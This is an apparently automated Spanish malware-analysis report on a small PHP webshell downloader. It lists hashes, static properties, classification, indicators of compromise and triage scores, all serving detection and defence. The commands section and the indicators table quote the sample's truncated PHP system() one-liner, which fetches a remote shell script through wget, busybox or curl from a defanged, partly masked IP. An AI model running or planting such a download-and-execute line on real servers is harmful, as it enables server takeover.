# 🧬 Payload Analysis

`8c0d3036d8d57054b2eb0311d591094c9f44213f0c16208bc644831a3de0606e`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `High`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8c0d3036d8d57054b2eb0311d591094c9f44213f0c16208bc644831a3de0606e`
- **SHA1:** `8730d848bd150f2ef39a0c62c78055a622ebe773`
- **MD5:** `526f3ddf544a130aa900ce4dd21a1c0b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | PHP script, ASCII text, with no line terminators |
| Tamaño | 171 B |
| Entropía | 4.89 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=PHP script, ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
<?php system('(wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh||busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh||cur
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://45.153.34.XXX/rondo. | strings |
| ip | 45.153.34.XXX | static_analysis |
| command | <?php system('(wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|cur | strings |
| hash | 8c0d3036d8d57054b2eb0311d591094c9f44213f0c16208bc644831a3de0606e | static_analysis |
| ip | 94.154.43.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | valid script |
| Prioridad | medium |
| Score | 10.0 |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
